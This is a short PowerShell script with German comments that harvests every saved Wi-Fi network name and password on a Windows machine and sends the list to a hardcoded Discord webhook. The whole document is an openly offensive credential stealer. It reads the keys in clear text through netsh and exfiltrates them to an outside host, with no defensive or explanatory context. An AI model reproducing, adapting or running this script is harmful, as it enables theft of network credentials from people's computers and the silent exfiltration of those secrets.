# WLAN-Passwörter auslesen
$profiles = netsh wlan show profiles | Select-String "Alle Benutzerprofile" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}

$all = @()
foreach ($name in $profiles) {
    $key = netsh wlan show profile name="$name" key=clear | Select-String "Schlüsselinhalt"
    $pwd = ($key -split ":")[1].Trim()
    $all += "$name : $pwd"
}

$result = $all -join "`n"

# An Discord senden
$body = @{
    "content" = "WLAN-Passwörter:`n$result"
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1377037403595739276/1bMWNUwWHnFiT-si9lhffTVM18sugLzq2Hz7NfEhmlmenMr36rgpu-y8wDLljLz08Zp3" -Method Post -ContentType "application/json" -Body $body